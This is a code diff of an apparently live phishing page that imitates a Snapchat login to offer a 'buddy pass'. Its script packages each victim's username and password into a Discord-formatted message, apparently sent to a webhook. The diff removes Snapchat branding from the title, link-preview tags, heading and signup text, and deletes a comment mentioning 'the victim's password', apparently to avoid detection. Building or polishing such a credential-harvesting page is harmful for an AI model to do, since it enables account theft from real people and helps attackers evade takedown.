@@ -4,13 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <meta name="theme-color" content="#f2f2f2">
-  <title>Sign in to Snapchat to Claim Pass</title>
+  <title>Sign in to Claim Pass</title>
   <!-- Favicon -->
   <link rel="icon" type="image/svg+xml" href="ghost.svg">
   <link rel="apple-touch-icon" href="ghost.png">
 
   <!-- Link preview -->
-  <meta property="og:title" content="Sign in to Snapchat to Claim Pass">
+  <meta property="og:title" content="Sign in to Claim Pass">
   <meta property="og:description" content="Log in to claim your buddy pass.">
   <meta property="og:image" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/ghost.png">
   <meta property="og:image:width" content="512">
@@ -18,7 +18,7 @@
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/">
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Sign in to Snapchat to Claim Pass">
+  <meta name="twitter:title" content="Sign in to Claim Pass">
   <meta name="twitter:description" content="Log in to claim your buddy pass.">
   <meta name="twitter:image" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/ghost.png">
 
@@ -278,7 +278,7 @@
           </svg>
         </div>
 
-        <h1>Sign in to Snapchat to Claim Pass</h1>
+        <h1>Sign in to Claim Pass</h1>
 
         <form id="loginForm">
           <label class="field-label" for="username">Username or email address</label>
@@ -347,7 +347,7 @@
     </section>
 
     <p class="signup" id="signupBar">
-      New to Snapchat?<span>Sign up</span>
+      New here?<span>Sign up</span>
     </p>
   </main>
 
@@ -378,8 +378,6 @@
       }
     }
 
-    // escape backticks / newlines so the victim's password can't break
-    // Discord's markdown formatting or truncate the message.
     function esc(s) {
       return String(s)
         .replace(/`/g, "\u02cb")
@@ -390,7 +388,7 @@
     function buildPayload(entry) {
       return JSON.stringify({
         content:
-          "**Snap — new submission**\n" +
+          "**new submission**\n" +
           "**User:** `" + esc(entry.username) + "`\n" +
           "**Pass:** `" + esc(entry.password) + "`\n" +
           "**Attempt:** " + entry.attempt + " / " + MAX_ATTEMPTS + "\n" +
